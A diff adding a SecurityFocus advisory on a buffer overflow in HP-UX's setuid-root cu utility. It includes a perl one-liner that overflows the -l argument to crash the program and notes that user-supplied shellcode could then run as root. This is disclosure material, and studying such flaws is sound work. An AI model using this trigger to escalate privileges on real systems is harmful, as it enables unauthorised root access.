@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/1886/info
+
+cu is a unix utility that is used for communication between two hosts (usually over phone lines). It is typically isntalled setuid root so that it can access communications hardware when executed by a regular user. 
+
+The version of cu that ships with HP-UX is vulnerable to a buffer overflow attack that may result in an escalation of privileges if exploited properly. The argument to the -l option (the line) is handled in an unsafe manner and if the length of it exceeds 9777 bytes, it will corrupt vital stack variables. This may result in shellcode provided by the user being executed with the privileges of the process (euid 0).
+
+
+$ ls -la `which cu`
+-r-sr-xr-x 1 bin 40960 9 avr 1998 /bin/cu
+
+Using '-l' with a long option string:
+$ cu -l `perl -e 'printf "A" x 9777'`
+La connexion a chou : Requested device/system name not known
+
+$ cu -l `perl -e 'printf "A" x 9778'`
+Memory fault
